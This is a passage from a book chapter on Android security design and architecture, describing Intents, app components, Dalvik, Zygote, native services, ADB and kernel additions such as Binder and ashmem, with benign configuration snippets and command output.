applications execute under the same UID. This subsequently allows these\napps access to the same fi le system data store, and potentially other resources.\nThe manifest fi le is often automatically generated by the development envi-\nronment, such as Eclipse or Android Studio, and is converted from plaintext\nXML to binary XML during the build process.\nIntents\nA key part of inter-app communication is Intents. These are message objects that\ncontain information about an operation to be performed, the optional target\ncomponent on which to act, and additional fl ags or other supporting information\n(which may be signifi cant to the recipient). Nearly all common actions—such as\nc02.indd 01:14:22:PM 02/24/2014 Page 35\n36 Chapter 2 ■ Android Security Design and Architecture\ntapping a link in a mail message to launch the browser, notifying the messaging\napp that an SMS has arrived, and installing and removing applications—involve\nIntents being passed around the system.\nThis is akin to an IPC or remote procedure call (RPC) facility where applica-\ntions’ components can interact programmatically with one another, invoking\nfunctionality and sharing data. Given the enforcement of the sandbox at a lower\nlevel (fi le system, AIDs, and so on), applications typically interact via this API.\nThe Android runtime acts as a reference monitor, enforcing permissions checks\nfor Intents, if the caller and/or the callee specify permission requirements for\nsending or receipt of messages.\nWhen declaring specifi c components in a manifest, it is possible to specify\nan intent fi lter, which declares the criteria to which the endpoint handles. Intent\nfi lters are especially used when dealing with intents that do not have a specifi c\ndestination, called implicit intents.\nFor example, suppose an application’s manifest contains a custom permission\ncom.wiley.permission.INSTALL_WIDGET, and an activity, com.wiley.MyApp\n.InstallWidgetActivity, which uses this permission to restrict launching of\nthe InstallWidgetActivity:\n<manifest android:versionCode=\"1\" android:versionName=\"1.0\"\npackage=\"com.wiley.MyApp\"\n...\n<permission android:name=\"com.wiley.permission.INSTALL_WIDGET\"\nandroid:protectionLevel=\"signature\" />\n...\n<activity android:name=\".InstallWidgetActivity\"\nandroid:permission=\"com.wiley.permission.INSTALL_WIDGET\"/>\nHere we see the permission declaration and the activity declaration. Note,\ntoo, that the permission has a protectionLevel attribute of signature. This\nlimits which other applications can request this permission to just those signed\nby the same key as the app that initially defi ned this permission.\nActivities\nSimply put, an Activity is a user-facing application component, or UI. Built on\nthe base Activity class, activities consist of a window, along with pertinent UI\nelements. Lower-level management of Activities is handled by the appropriately\nnamed Activity Manager service, which also processes Intents that are sent to\ninvoke Activities between or even within applications. These Activities are\ndefi ned within the application’s manifest, thusly:\nc02.indd 01:14:22:PM 02/24/2014 Page 36\nChapter 2 ■ Android Security Design and Architecture 37\n...\n<activity android:theme=\"@style/Theme_NoTitle_FullScreen\"\nandroid:name=\"com.yougetitback.androidapplication.ReportSplashScreen\"\nandroid:screenOrientation=\"portrait\" />\n<activity android:theme=\"@style/Theme_NoTitle_FullScreen\"\nandroid:name=\"com.yougetitback.androidapplication.SecurityQuestionScreen\"\nandroid:screenOrientation=\"portrait\" />\n<activity android:label=\"@string/app_name\"\nandroid:name=\"com.yougetitback.androidapplication.SplashScreen\"\nandroid:clearTaskOnLaunch=\"false\" android:launchMode=\"singleTask\"\nandroid:screenOrientation=\"portrait\">\n<intent-filter>\n<action android:name=\"android.intent.action.MAIN\" />\n</intent-filter>\n...\nHere we see activities, along with specifi ers for style/UI information, screen\norientation, and so on. The launchMode attribute is notable, as it affects how the\nActivity is launched. In this case, the singleTask value indicates that only one\ninstance of this particular activity can exist at a time; as opposed to launching\na separate instance for each invocation. The current instance (if there is one) of\nthe application will receive and process the Intent which invoked the activity.\nBroadcast Receivers\nAnother type of IPC endpoint is the Broadcast Receiver. These are commonly\nfound where applications want to receive an implicit Intent matching certain\nother criteria. For example, an application that wants to receive the Intent asso-\nciated with an SMS message would register a receiver in its manifest with an\nintent fi lter matching the android.provider.Telephony.SMS_RECEIVED action:\n<receiver android:name=\".MySMSReceiver\">\n<intent-filter android:priority:\"999\">\n<action android:name=\"android.provider.Telephony.SMS_RECEIVED\" />\n</intent-filter>\n</receiver>\nNOTE Broadcast Receivers may also be registered programmatically at runtime by\nusing the registerReceiver method. This method can also be overloaded to set\npermission restrictions on the receiver.\nSetting permission requirements on Broadcast Receivers can limit which\napplications can send Intents to that endpoint.\nc02.indd 01:14:22:PM 02/24/2014 Page 37\n38 Chapter 2 ■ Android Security Design and Architecture\nServices\nServices are application components without a UI that run in the background,\neven if the user is not interacting directly with the Service’s application. Some\nexamples of common services on Android include the SmsReceiverService and\nthe BluetoothOppService. Although each of these services runs outside of the\nuser’s direct view, like other Android app components they can take advantage\nof IPC facilities by sending and receiving Intents.\nServices must also be declared in the application’s manifest. For example,\nhere is a simple defi nition for a service also featuring an intent fi lter:\n<service\nandroid:name=\"com.yougetitback.androidapplication.FindLocationService\">\n<intent-filter>\n<action\nandroid:name=\"com.yougetitback.androidapplication.FindLocationService\" />\n</intent-filter>\n</service>\nServices can typically be stopped, started, or bound, all by way of Intents. In\nthe lattermost case, binding to a service, an additional set of IPC or RPC proce-\ndures may be available to the caller. These procedures are specifi c to a service’s\nimplementation, and take deeper advantage of the Binder service, discussed\nlater in the “Kernel” section of the chapter.\nContent Providers\nContent Providers act as a structured interface to common, shared data stores.\nFor example, the Contacts provider and Calendar provider manage centralized\nrepositories of contact entries and calendar entries, respectively, which can be\naccessed by other applications (with appropriate permissions). Applications\nmay also create their own Content Providers, and may optionally expose them\nto other applications. The data exposed by these providers is typically backed\nby an SQLite database or a direct fi le system path (for example, a media player\nindexing and sharing paths to MP3 fi les).\nMuch like other app components, the ability to read and write Content Providers\ncan be restricted with permissions. Consider the following snippet from an\nexample AndroidManifest.xml fi le:\n<provider android:name=\"com.wiley.example.MyProvider\"\nandroid:writePermission=\"com.wiley.example.permission.WRITE\"\nandroid:authorities=\"com.wiley.example.data\" />\nThe application declares a provider, named MyProvider, which corre-\nsponds to the class implementing the provider functionality. Then it declares a\nwritePermission of com.wiley.example.permission.WRITE, indicating that\nonly apps bearing this custom permission can write to this provider. Finally,\nc02.indd 01:14:22:PM 02/24/2014 Page 38\nChapter 2 ■ Android Security Design and Architecture 39\nit specifi es the authorities or content uniform resource identifi er (URI) that\nthis provider will act for. Content URIs take the form of content://[authori-\ntyname]/ and may include additional path/argument information, possibly\nsignifi cant to the underlying provider implementation (for example, content://\ncom.wiley.example.data/foo).\nIn Chapter 4, we demonstrate a means of discovering and attacking some of\nthese IPC endpoints.\nThe Android Framework\nThe glue between apps and the runtime, the Android Framework provides the\npieces—packages and their classes—for developers to perform common tasks.\nSuch tasks might include managing UI elements, accessing shared data stores,\nand passing messages between application components. To wit, it includes any\nnon-app-specifi c code that still executes within the DalvikVM.\nThe common framework packages are those within the android.* namespace,\nsuch as android.content or android.telephony. Android also provides many\nstandard Java classes (in the java.* and javax.* namespaces), as well as addi-\ntional third-party packages, such as Apache HTTP client libraries and the SAX\nXML parser. The Android Framework also includes the services used to manage\nand facilitate much of the functionality provided by the classes within. These\nso-called managers are started by system_server (discussed in the “Zygote”\nsection) after system initialization. Table 2-1 shows some of these managers and\ntheir description/role in the framework.\nTable 2-1: Framework Managers\nFRAMEWORK SERVICE DESCRIPTION\nActivity Manager Manages Intent resolution/destinations, app/activity launch,\nand so on\nView System Manages views (UI compositions that a user sees) in activities\nPackage Manager Manages information and tasks about packages currently\nand previously queued to be installed on the system\nTelephony Manager Manages information and tasks related to telephony services,\nradio state(s), and network and subscriber information\nResource Manager Provides access to non-code app resources such as graphics,\nUI layouts, string data, and so on\nLocation Manager Provides an interface for setting and retrieving (GPS, cell,\nWiFi) location information, such as location fi x/coordinates\nNotifi cation Manager Manages various event notifi cations, such as playing sounds,\nvibrating, fl ashing LEDs, and displaying icons in the status bar\nc02.indd 01:14:22:PM 02/24/2014 Page 39\n40 Chapter 2 ■ Android Security Design and Architecture\nYou can see some of these managers appearing as threads within the\nsystem_server process by using the ps command, specifying the system_server\nPID and the -t option:\nroot@generic:/ # ps -t -p 376\nUSER PID PPID ... NAME\nsystem 376 52 ... system_server\n...\nsystem 389 376 ... SensorService\nsystem 390 376 ... WindowManager\nsystem 391 376 ... ActivityManager\n...\nsystem 399 376 ... PackageManager\nThe Dalvik Virtual Machine\nThe DalvikVM is register-based, as opposed to stack-based. Although Dalvik is\nsaid to be Java-based it is not Java insofar as Google does not use the Java logos and\nthe Android application model has no relationship with JSRs (Java Specifi cation\nRequirements). To the Android application developer, the DalvikVM might look\nand feel like Java but it isn’t. The overall development process looks like this:\n1. Developer codes in what syntactically looks like Java.\n2. Source code is compiled into .class fi les (also Java-like).\n3. The resulting class fi les are translated into Dalvik bytecode.\n4. All class fi les are combined into a single Dalvik executable (DEX) fi le.\n5. Bytecode is loaded and interpreted by the DalvikVM.\nAs a register-based virtual machine, Dalvik has about 64,000 virtual regis-\nters. However, it is most common for only the fi rst 16, or rarely 256, to be used.\nThese registers are simply designated memory locations in the VM’s memory\nthat simulate the register functionality of microprocessors. Just like an actual\nmicroprocessor, the DalvikVM uses these registers to keep state and generally\nkeep track of things while it executes bytecode.\nThe DalvikVM is specifi cally designed for the constraints imposed by an\nembedded system, such as low memory and processor speeds. Therefore, the\nDalvikVM is designed with speed and effi ciency in mind. Virtual machines,\nafter all, are an abstraction of the underlying register machine of the CPU. This\ninherently means loss of effi ciency, which is why Google sought to minimize\nthese effects.\nTo make the most within these constraints, DEX fi les are optimized before\nbeing interpreted by the virtual machine. For DEX fi les launched from within\nan Android app, this generally happens only once when the application is fi rst\nlaunched. The output of this optimization process is an Optimized DEX fi le\nc02.indd 01:14:22:PM 02/24/2014 Page 40\nChapter 2 ■ Android Security Design and Architecture 41\n(ODEX). It should be noted that ODEX fi les are not portable across different\nrevisions of the DalvikVM or between devices.\nSimilar to the Java VM, the DalvikVM interfaces with lower-level native code\nusing Java Native Interface (JNI). This bit of functionality allows both calling from\nDalvik code into native code and vice versa. More detailed information about the\nDalvikVM, the DEX fi le format, and JNI on Android is available in the offi cial\nDalvik documentation at http://milk.com/kodebase/dalvik-docs-mirror/docs/.\nZygote\nOne of the fi rst processes started when an Android device boots is the Zygote\nprocess. Zygote, in turn, is responsible for starting additional services and\nloading libraries used by the Android Framework. The Zygote process then\nacts as the loader for each Dalvik process by creating a copy of itself, or forking.\nThis optimization prevents having to repeat the expensive process of loading\nthe Android Framework and its dependencies when starting Dalvik processes\n(including apps). As a result, core libraries, core classes, and their corresponding\nheap structures are shared across instances of the DalvikVM. This creates some\ninteresting possibilities for attack, as you read in greater detail in Chapter 12.\nZygote’s second order of business is starting the system_server process. This\nprocess holds all of the core services that run with elevated privileges under the\nsystem AID. In turn, system_server starts up all of the Android Framework\nservices introduced in Table 2-1.\nNOTE The system_server process is so important that killing it makes the device\nappear to reboot. However, only the device’s Dalvik subsystem is actually rebooting.\nAfter its initial startup, Zygote provides library access to other Dalvik pro-\ncesses via RPC and IPC. This is the mechanism by which the processes that\nhost Android app components are actually started.\nUser-Space Native Code\nNative code, in operating system user-space, comprises a large portion of Android.\nThis layer is comprised of two primary groups of components: libraries and\ncore system services. This section discusses these groups, and many individual\ncomponents that belong to these groups, in a bit more detail.\nLibraries\nMuch of the low-level functionality relied upon by higher-level classes in the\nAndroid Framework is implemented by shared libraries and accessed via JNI.\nMany of these libraries are the same well-known, open source projects used\nc02.indd 01:14:22:PM 02/24/2014 Page 41\n42 Chapter 2 ■ Android Security Design and Architecture\nin other Unix-like operating systems. For example, SQLite provides local data-\nbase functionality; WebKit provides an embeddable web browser engine; and\nFreeType provides bitmap and vector font rendering.\nVendor-specifi c libraries, namely those that provide support for hardware\nunique to a device model, are in /vendor/lib (or /system/vendor/lib). These\nwould include low-level support for graphics devices, GPS transceivers, or cel-\nlular radios. Non-vendor-specifi c libraries are in /system/lib, and typically\ninclude external projects, for example:\n■ libexif: A JPEG EXIF processing library\n■ libexpat: The Expat XML parser\n■ libaudioalsa/libtinyalsa: The ALSA audio library\n■ libbluetooth: The BlueZ Linux Bluetooth library\n■ libdbus: The D-Bus IPC library\nThese are only a few of the many libraries included in Android. A device\nrunning Android 4.3 contains more than 200 shared libraries.\nHowever, not all underlying libraries are standard. Bionic is a notable exam-\nple. Bionic is a derivation of the BSD C runtime library, aimed at providing a\nsmaller footprint, optimizations, and avoiding licensing issues associated with\nthe GNU Public License (GPL). These differences come at a slight price. Bionic’s\nlibc is not as complete as, say, the GNU libc or even Bionic’s parent BSD libc\nimplementation. Bionic also contains quite a bit of original code. In an effort to\nreduce the C runtime’s footprint, the Android developers implemented a custom\ndynamic linker and threading API.\nBecause these libraries are developed in native code, they are prone to memory\ncorruption vulnerabilities. That fact makes this layer a particularly interesting\narea to explore when researching Android security.\nCore Services\nCore services are those that set up the underlying OS environment and native\nAndroid components. These services range from those that fi rst initialize user-\nspace, such as init, to providing crucial debugging functionality, such as adbd\nand debuggerd. Note that some core services may be hardware or version spe-\ncifi c; this section is certainly not an exhaustive list of all user-space services.\ninit\nOn a Linux system, as Android is, the fi rst user-space process started by the\nLinux kernel is the init command. Just as with other Linux systems, Android’s\nc02.indd 01:14:22:PM 02/24/2014 Page 42\nChapter 2 ■ Android Security Design and Architecture 43\ninit program initializes the user-space environment by executing a series of\ncommands. However, Android uses a custom implementation of init. Instead\nof executing run-level-based shell scripts from /etc/init.d, Android executes\ncommands based on directives found in /init.rc. For device-specifi c direc-\ntives, there may be a fi le called /init.[hw].rc, where [hw] is the codename of\nthe hardware for that specifi c device. The following is a snippet of the contents\nof /init.rc on an HTC One V:\nservice dbus /system/bin/dbus-daemon --system --nofork\nclass main\nsocket dbus stream 660 bluetooth bluetooth\nuser bluetooth\ngroup bluetooth net_bt_admin\nservice bluetoothd /system/bin/bluetoothd -n\nclass main\nsocket bluetooth stream 660 bluetooth bluetooth\nsocket dbus_bluetooth stream 660 bluetooth bluetooth\n# init.rc does not yet support applying capabilities, so run as root and\n# let bluetoothd drop uid to bluetooth with the right linux capabilities\ngroup bluetooth net_bt_admin misc\ndisabled\nservice bluetoothd_one /system/bin/bluetoothd -n\nclass main\nsocket bluetooth stream 660 bluetooth bluetooth\nsocket dbus_bluetooth stream 660 bluetooth bluetooth\n# init.rc does not yet support applying capabilities, so run as root and\n# let bluetoothd drop uid to bluetooth with the right linux capabilities\ngroup bluetooth net_bt_admin misc\ndisabled\noneshot\n# Discretix DRM\nservice dx_drm_server /system/bin/DxDrmServerIpc -f -o allow_other \\\n/data/DxDrm/fuse\non property:ro.build.tags=test-keys\nstart htc_ebdlogd\non property:ro.build.tags=release-keys\nstart htc_ebdlogd_rel\nservice zchgd_offmode /system/bin/zchgd -pseudooffmode\nuser root\ngroup root graphics\ndisabled\nc02.indd 01:14:22:PM 02/24/2014 Page 43\n44 Chapter 2 ■ Android Security Design and Architecture\nThese init scripts specify several tasks, including\n■ Starting services or daemons that should be started at boot, through the\nservice directive\n■ Specifying the user and group under which the service should run, per\nthe indented arguments below each service entry\n■ Setting system-wide properties and confi guration options that are exposed\nvia the Property Service\n■ Registering actions or commands to execute upon occurrence of certain\nevents, such as modifi cation of a system property or mounting of a fi le\nsystem, through the “on” directive\nThe Property Service\nTucked inside Android’s init process is the Property Service, which provides a\npersistent (per-boot), memory-mapped, key-value confi guration facility. Many\nOS and framework components rely upon these properties, which include items\nsuch as network interface confi guration, radio options, and even security-related\nsettings, the details of which are discussed in Chapter 3.\nProperties can be retrieved and set in numerous ways. For example, using the\ncommand-line utilities getprop and setprop, respectively; programmatically\nin native code via property_get and property_set in libcutils; or program-\nmatically using the android.os.SystemProperties class (which in turn calls\nthe aforementioned native functions). An overview of the property service is\nshown in Figure 2-2.\nproperty setter\nunix domain socket\nproperty consumer property service\nread write load\nproperty_workspace\n(shared memory) persistent file\nFigure 2-2: The Android Property Service\nc02.indd 01:14:22:PM 02/24/2014 Page 44\nChapter 2 ■ Android Security Design and Architecture 45\nRunning the getprop command on an Android device (in this case, an HTC\nOne V), you see output which includes DalvikVM options, current wallpaper,\nnetwork interface confi guration, and even vendor-specifi c update URLs:\nroot@android:/ # getprop\n[dalvik.vm.dexopt-flags]: [m=y]\n[dalvik.vm.heapgrowthlimit]: [48m]\n[dalvik.vm.heapsize]: [128m]\n...\n[dhcp.wlan0.dns1]: [192.168.1.1]\n[dhcp.wlan0.dns2]: []\n[dhcp.wlan0.dns3]: []\n[dhcp.wlan0.dns4]: []\n[dhcp.wlan0.gateway]: [192.168.1.1]\n[dhcp.wlan0.ipaddress]: [192.168.1.125]\n[dhcp.wlan0.leasetime]: [7200]\n...\n[ro.htc.appupdate.exmsg.url]:\n[http://apu-msg.htc.com/extra-msg/rws/and-app/msg]\n[ro.htc.appupdate.exmsg.url_CN]:\n[http://apu-msg.htccomm.com.cn/extra-msg/rws/and-app/msg]\n[ro.htc.appupdate.url]:\n[http://apu-chin.htc.com/check-in/rws/and-app/update]\n...\n[service.brcm.bt.activation]: [0]\n[service.brcm.bt.avrcp_pass_thru]: [0]\nSome properties, which are set as “read-only,” cannot be changed—even by\nroot (though there are some device-specifi c exceptions). These are designated\nby the ro prefi x:\n[ro.secure]: [0]\n[ro.serialno]: [HT26MTV01493]\n[ro.setupwizard.enterprise_mode]: [1]\n[ro.setupwizard.mode]: [DISABLED]\n[ro.sf.lcd_density]: [240]\n[ro.telephony.default_network]: [0]\n[ro.use_data_netmgrd]: [true]\n[ro.vendor.extension_library]: [/system/lib/libqc-opt.so]\nYou can fi nd some additional details of the Property Service and its security\nimplications in Chapter 3.\nRadio Interface Layer\nThe Radio Interface Layer (RIL), which is covered in detail in Chapter 11, pro-\nvides the functionality that puts the “phone” in “smartphone.” Without this\ncomponent, an Android device will not be able to make calls, send or receive\nc02.indd 01:14:22:PM 02/24/2014 Page 45\n46 Chapter 2 ■ Android Security Design and Architecture\ntext messages, or access the Internet without Wi-Fi. As such, it will be found\nrunning on any Android device with a cellular data or telephony capability.\ndebuggerd\nAndroid’s primary crash reporting facility revolves around a daemon called debug-\ngerd. When the debugger daemon starts up, it opens a connection to Android’s\nlogging facility and starts listening for clients on an abstract namespace socket.\nWhen each program begins, the linker installs signal handlers to deal with\ncertain signals.\nWhen one of the captured signals occurs, the kernel executes the signal\nhandler function, debugger_signal_handler. This handler function connects\nto aforementioned socket, as defi ned by DEBUGGER_SOCKET_NAME. After it’s con-\nnected, the linker notifi es the other end of the socket (debuggerd) that the target\nprocess has crashed. This serves to notify debuggerd that it should invoke its\nprocessing and thus create a crash report.\nADB\nThe Android Debugging Bridge, or ADB, is composed of a few pieces, including\nthe adbd daemon on the Android device, the adb server on the host worksta-\ntion, and the corresponding adb command-line client. The server manages\nconnectivity between the client and the daemon running on the target device,\nfacilitating tasks such as executing a shell; debugging apps (via the Java Debug\nWire Protocol); forwarding sockets and ports; fi le transfer; and installing/\nuninstalling app packages.\nAs a brief example, you can run the adb devices command to list your\nattached devices. As ADB is not already running on our host, it is initialized,\nlistening on 5037/tcp for client connections. Next, you can specify a target\ndevice by its serial number and run adb shell, giving you a command shell\non the device:\n% adb devices\n* daemon not running. starting it now on port 5037 *\n* daemon started successfully *\nList of devices attached\nD025A0A024441MGK device\nHT26MTV01493 device\n% adb -s HT26MTV01493 shell\nroot@android:/ #\nWe can see also that the ADB daemon, adbd, is running on the target device\nby grepping for the process (or in this case, using pgrep):\nc02.indd 01:14:22:PM 02/24/2014 Page 46\nChapter 2 ■ Android Security Design and Architecture 47\nroot@android:/ # busybox pgrep -l adbd\n2103 /sbin/adbd\nADB is pivotal for developing with Android devices and emulators. As such,\nwe’ll be using it heavily throughout the book. You can fi nd detailed informa-\ntion on using the adb command at http://developer.android.com/tools/\nhelp/adb.html.\nVolume Daemon\nThe Volume Daemon, or vold, is responsible for mounting and unmounting\nvarious fi le systems on Android. For instance, when an SD card is inserted,\nvold processes that event by checking the SD card’s fi le system for errors (such\nas through launching fsck) and mounting the card onto the appropriate path\n(i.e., /mnt/sdcard). When the card is pulled or ejected (manually by the user)\nvold unmounts the target volume.\nThe Volume Daemon also handles mounting and unmounting Android Secure\nContainer (ASEC) fi les. These are used for encrypting app packages when they\nare stored on insecure fi le systems such as FAT. They are mounted via loopback\ndevices at app load time, typically onto /mnt/asec.\nOpaque Binary Blobs (OBBs) are also mounted and unmounted by the Volume\nDaemon. These fi les are packaged with an application to store data encrypted\nwith a shared secret. Unlike ASEC containers, however, the calls to mount\nand unmount OBBs are performed by the applications themselves, rather than\nthe system. The following code snippet demonstrates creating an OBB with\nSuperSecretKey as the shared key:\nobbFile = \"path/to/some/obbfile\";\nstorageRef = (StorageManager) getSystemService(STORAGE_SERVICE);\nstorageRef.mountObb(obbFile, \"SuperSecretKey\", obbListener);\nobbContent = storageRef.getMountedObbPath(obbFile);\nGiven that the Volume Daemon runs as root, it is an enticing target in both\nits functionality and its potential vulnerability. You can fi nd details on privilege\nescalation attacks against vold and other similar services in Chapter 3.\nOther Services\nThere are numerous other services that run on many Android devices, provid-\ning additional—though not necessarily critical—functionality (depending on\nthe device and the service). Table 2-2 highlights some of these services, their\npurposes, and their privilege levels on the system (UID, GID, and any supple-\nmental groups for that user, which may be specifi ed in the system’s init.rc fi les).\nc02.indd 01:14:22:PM 02/24/2014 Page 47\n48 Chapter 2 ■ Android Security Design and Architecture\nTable 2-2: User-space Native Services\nUID, GID,\nSUPPLEMENTAL\nSERVICE DESCRIPTION GROUPS\nnetd Present in Android 2.2+, used by the Network UID: 0 / root\nManagement Service for confi guring network\nGID: 0 / root\ninterfaces, running the PPP daemon (pppd), tether-\ning, and other similar tasks.\nmediaserver Responsible for starting media related services, UID: 1013 / media\nincluding Audio Flinger, Media Player Service,\nGID: 1005 / audio\nCamera Service, and Audio Policy Service.\nGroups: 1006 /\ncamera\n1026 / drmpc\n3001 / net_bt_admin\n3002 / net_bt\n3003 / inet\n3007 / net_bw_acct\ndbus- Manages D-Bus–specifi c IPC/message passing (pri- UID: 1002 / bluetooth\ndaemon marily for non-Android specifi c components).\nGID: 1002 / bluetooth\nGroups: 3001 /\nnet_bt_admin\ninstalld Manages installation of application packages on UID: 1012 / install\nthe devices (on Package Manager’s behalf), includ-\nGID: 1012 / install\ning initial optimization of Dalvik Executable (DEX)\nbytecode in application packages (APKs). On pre-4.2 devices:\nUID: 0 /root\nGID: 0 /root\nkeystore Responsible for secure storage of key-value UID: 1017 / keystore\npairs on the system (protected by a user-defi ned\nGID: 1017 / keystore\npassword).\nGroups: 1026 / drmpc\ndrmserver Provides the low-level operations for Digital Rights UID: 1019 / drm\nManagement (DRM). Apps interface with this\nGID: 1019 / drm\nservice by way of higher-level classes in the DRM\npackage (in Android 4.0+). Groups: 1026 / drm-\nrpc\n3003 / inet\nc02.indd 01:14:22:PM 02/24/2014 Page 48\nChapter 2 ■ Android Security Design and Architecture 49\nUID, GID,\nSUPPLEMENTAL\nSERVICE DESCRIPTION GROUPS\nserviceman- Acts as the arbiter for registration/deregistration of UID: 1000 / system\nager app services with Binder IPC endpoints.\nGID: 1000 / system\nsurface- Present in Android 4.0+, the display compositor UID: 1000 / system\nflinger responsible for building the graphics frame/screen\nGID: 1000 / system\nto be displayed and sending to the graphics card\ndriver.\nUeventd Present in Android 2.2+, user-space daemon for UID: 0 / root\nhandling system and device events and taking cor-\nGID: 0 /root\nresponding actions, such as loading appropriate\nkernel modules.\nAs stated previously, this is by no means an exhaustive list. Comparing the\nprocess list, init.rc, and fi le system of various devices to that of a Nexus device\noften reveals a plethora of nonstandard services. These are particularly inter-\nesting because their code may not be of the same quality of the core services\npresent in all Android devices.\nThe Kernel\nAlthough Android’s foundation, the Linux kernel, is fairly well documented\nand understood, there are some notable differences between the vanilla Linux\nkernel and that which is used by Android. This section explains some of those\nchanges, especially those which are pertinent to Android security.\nThe Android Fork\nEarly on, Google created an Android-centric fork of the Linux kernel, as many\nmodifi cations and additions weren’t compatible with the Linux kernel mainline\ntree. Overall, this includes approximately 250 patches, ranging from fi le system\nsupport and networking tweaks to process and memory management facili-\nties. According to one kernel engineer, most of these patches “represent[ed] a\nlimitation that the Android developers found in the Linux kernel.” In March\n2012, the Linux kernel maintainers merged the Android-specifi c kernel modi-\nfi cations into the mainline tree. Table 2-3 highlights some of the additions/\nchanges to the mainline kernel. We discuss several of these in more detail\nlater in this section.\nc02.indd 01:14:22:PM 02/24/2014 Page 49\n50 Chapter 2 ■ Android Security Design and Architecture\nTable 2-3: Android’s major changes to Linux kernel\nKERNEL CHANGE DESCRIPTION\nBinder IPC mechanism with additional features such as security\nvalidation of callers/callees; used by numerous system and\nframework services\nashmem Anonymous Shared Memory; fi le-based shared memory allocator;\nuses Binder IPC to allow processes to identify memory region fi le\ndescriptors\npmem Process Memory Allocator; used for managing large, contiguous\nregions of shared memory\nlogger System-wide logging facility\nRAM_CONSOLE Stores kernel log messages in RAM for viewing after a kernel panic\n“oom” modifi cations “Out of memory”-killer kills processes as memory runs low; in\nAndroid fork, OOM kills processes sooner than vanilla kernel, as\nmemory is being depleted\nwakelocks Power management feature to keep a device from entering\nlow-power state, and staying responsive\nAlarm Timers Kernel interface for AlarmManager, to instruct kernel to\nschedule “waking up”\nParanoid Networking Restricts certain networking operations and features to specifi c\ngroup IDs\ntimed output / gpio Allows user-space programs to change and restore GPIO registers\nafter a period of time\nyaff s2 Support for the yaff s2 fl ash fi le system\nBinder\nPerhaps one of the most important additions to Android’s Linux kernel was a\ndriver known as Binder. Binder is an IPC mechanism based on a modifi ed version\nof OpenBinder, originally developed by Be, Inc., and later Palm, Inc. Android’s\nBinder is relatively small (approximately 4,000 lines of source code across two\nfi les), but is pivotal to much of Android’s functionality.\nIn a nutshell, the Binder kernel driver facilitates the overall Binder archi-\ntecture. The Binder—as an architecture—operates in a client-server model. It\nallows a process to invoke methods in “remote” processes synchronously. The\nBinder architecture abstracts away underlying details, making such method\ncalls seem as though they were local function calls. Figure 2-3 shows Binder’s\ncommunication fl ow.\nc02.indd 01:14:22:PM 02/24/2014 Page 50\nChapter 2 ■ Android Security Design and Architecture 51\nProcess A Proxy Process B with Threads\nBinder Driver\nFigure 2-3: Binder communication\nBinder also uses process ID (PID) and UID information as a means of\nidentifying the calling process, allowing the callee to make decisions about\naccess control. This typically occurs through calls to methods like Binder\n.getCallingUid and Binder.getCallingPid, or through higher-level checks\nsuch as checkCallingPermission.\nAn example of this in practice would be the ACCESS_SURFACE_FLINGER permis-\nsion. This permission is typically granted only to the graphics system user, and\nallows access to the Binder IPC interface of the Surface Flinger graphics service.\nFurthermore, the caller’s group membership—and subsequent bearing of the\nrequired permission—is checked through a series of calls to the aforementioned\nfunctions, as illustrated by the following code snippet:\nconst int pid = ipc->getCallingPid();\nconst int uid = ipc->getCallingUid();\nif ((uid != AID_GRAPHICS) &&\n!PermissionCache::checkPermission(sReadFramebuffer,\npid, uid)) {\nALOGE(\"Permission Denial: \"\n\"can't read framebuffer pid=%d, uid=%d\", pid, uid);\nreturn PERMISSION_DENIED;\n}\nAt a higher level, exposed IPC methods, such as those provided by bound Services,\nare typically distilled into an abstract interface via Android Interface Defi nition\nLanguage (AIDL). AIDL allows for two applications to use “agreed-upon” or stan-\ndard interfaces for sending and receiving data, keeping the interface separate from\nthe implementation. AIDL is akin to other Interface Defi nition Language fi les or,\nin a way, C/C++ header fi les. Consider the following sample AIDL snippet:\nc02.indd 01:14:22:PM 02/24/2014 Page 51\n52 Chapter 2 ■ Android Security Design and Architecture\n// IRemoteService.aidl\npackage com.example.android;\n// Declare any non-default types here with import statements\n/** Example service interface */\ninterface IRemoteService {\n/** Request the process ID of this service,\nto do evil things with it. */\nint getPid();\n/** Demonstrates some basic types that you can use as parameters\n* and return values in AIDL.\n*/\nvoid basicTypes(int anInt, long aLong, boolean aBoolean,\nfloat aFloat,\ndouble aDouble, String aString);\n}\nThis AIDL example defi nes a simple interface, IRemoteService, along with\ntwo methods: getPid and basicTypes. An application that binds to the service\nexposing this interface would subsequently be able to call the aforementioned\nmethods—facilitated by Binder.\nashmem\nAnonymous Shared Memory, or ashmem for short, was another addition to the\nAndroid Linux kernel fork. The ashmem driver basically provides a fi le-based,\nreference-counted shared memory interface. Its use is prevalent across much\nof Android’s core components, such as Surface Flinger, Audio Flinger, System\nServer, and the DalvikVM. Because ashmem is designed to automatically shrink\nmemory caches and reclaim memory regions when available system-wide\nmemory is low, it is well suited for low-memory environments.\nAt a low level, using ashmem is as simple as calling ashmem_create_region,\nand using mmap on the returned fi le descriptor:\nint fd = ashmem_create_region(\"SomeAshmem\", size);\nif(fd == 0) {\ndata = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n...\nAt a higher level, the Android Framework provides the MemoryFile class,\nwhich serves as a wrapper around the ashmem driver. Furthermore, processes\ncan use the Binder facility to later share these memory objects, leveraging the\nsecurity features of Binder to restrict access. Incidentally, ashmem proved to\nbe the source of a pretty serious fl aw in early 2011, allowing for a privilege\nescalation via Android properties. This is covered in greater detail in Chapter 3.\nc02.indd 01:14:22:PM 02/24/2014 Page 52\nChapter 2 ■ Android Security Design and Architecture 53\npmem\nAnother Android-specifi c custom driver is pmem, which manages large, physi-\ncally contiguous memory ranging between 1 megabyte (MB) and 16MB (or\nmore, depending on the implementation). These regions are special, in that\nthey are shared between user-space processes and other kernel drivers (such\nas GPU drivers). Unlike ashmem, the pmem driver requires the allocating\nprocess to hold a fi le descriptor to the pmem memory heap until all other\nreferences are closed.\nLogger\nThough Android’s kernel still maintains its own Linux-based kernel-logging\nmechanism, it also uses another logging subsystem, colloquially referred to\nas the logger. This driver acts as the support for the logcat command, used to\nview log buffers. It provides four separate log buffers, depending on the type\nof information: main, radio, event, and system. Figure 2-4 shows the fl ow of\nlog events and components that assist logger.\nThe main buffer is often the most voluminous, and is the source for application-\nrelated events. Applications typically call a method from the android.util.Log\nclass, where the invoked method corresponds to the log entry priority level—for\nexample, the Log.i method for “informational,” Log.d for “debug,” or Log.e for\n“error” level logs (much like syslog).\nOverview of Android Logging System\nTarget\nJava program\nSystem.out\n/System.err\ncom.android.internal.os\nNative program android.util.Log Host\nAndroidPrintstream\nADT in Eclipse\nstdout\nlogcat\nstdout liblog\n/stderr adbd 